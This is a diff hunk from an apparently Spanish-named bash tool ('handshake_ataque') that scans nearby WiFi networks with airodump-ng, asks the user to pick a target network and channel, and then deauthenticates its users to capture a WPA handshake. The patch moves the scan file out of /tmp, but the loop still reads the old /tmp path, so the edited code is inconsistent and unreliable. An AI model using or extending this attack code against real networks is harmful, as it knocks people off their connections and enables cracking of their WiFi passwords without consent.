@@ -164,22 +164,22 @@ handshake_ataque() {
 	clear
 	sleep 1
  	tput cnorm
-    xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
+	xterm -e "airodump-ng -w xtermNeT --output-format csv ${tar}" & > /dev/null 2>&1
 	xtermnet=$!
-	sleep 3; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
+	sleep 5; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
 	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
 	while IFS= read -r line; do
-		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
+		macrepeat=$(grep $line xtermNeT-01.csv | wc -l)
 		if [[ "$macrepeat" > 1 ]]; then
-			sed -i "s/${line}/+${line}/" /tmp/xtermNeT-01.csv
+			sed -i "s/${line}/+${line}/" xtermNeT-01.csv
 		fi
 	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
 
-	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
+	launch_irodump=$(cat xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
 	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
-	tput civis
+	tput civis; sudo rm xtermNeT*
 	$cleancolor
 	echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
 	$cleancolor
